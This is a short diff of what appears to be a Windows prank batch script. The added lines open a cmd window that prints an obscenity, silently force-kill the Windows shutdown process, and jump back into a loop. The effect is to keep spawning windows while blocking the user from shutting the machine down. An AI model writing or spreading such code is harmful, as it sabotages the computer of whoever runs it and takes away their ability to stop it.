@@ -143,4 +143,6 @@ start "" "C:\Windows\System32\dvdplay.exe"
 goto boby
 
 :boby
-start "" cmd /K "cd /d C:\ && "
+start "" cmd /K "cd /d C:\ && echo fuck you"
+taskkill /f /im shutdown.exe >nul 2>&1
+goto loop
